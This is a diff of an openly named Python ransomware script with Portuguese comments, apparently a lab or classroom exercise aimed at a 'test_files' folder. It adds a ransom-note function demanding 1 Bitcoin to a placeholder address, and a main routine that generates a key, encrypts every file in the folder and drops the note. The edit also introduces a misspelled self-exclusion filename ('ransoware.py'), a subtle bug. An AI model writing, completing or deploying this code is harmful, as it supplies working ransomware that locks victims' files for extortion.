@@ -26,6 +26,26 @@ def encontrar_arquivos(diretorio):
     for raiz, _, arquivos in os.walk(diretorio):
         for nome in arquivos:
             caminho = os.path.join(raiz, nome)
-            if nome != "ransomware.py" and not nome.endswith(".key"):
+            if nome != "ransoware.py" and not nome.endswith(".key"):
                 lista.append(caminho)
     return lista
+
+#5 Mensagem de resgate
+def criar_mensagem_resgate():
+    with open("mensagem_resgate.txt", "w") as file:
+        file.write("Seus arquivos foram criptografados!\n")
+        file.write("Para descriptografá-los, envie 1 Bitcoin para o endereço X e envie o comprovante.\n")
+        file.write("Após o pagamento, você receberá a chave de descriptografia.\n")
+
+# Execução principal
+def main():
+	gerar_chave()
+	chave = carregar_chave()
+	arquivos_para_criptografar = encontrar_arquivos("test_files")
+	for arquivo in arquivos_para_criptografar:
+		criptografar_arquivo(arquivo, chave)
+	criar_mensagem_resgate()
+	print("Todos os arquivos foram criptografados!")
+ 
+if __name__ == "__main__":
+	main()
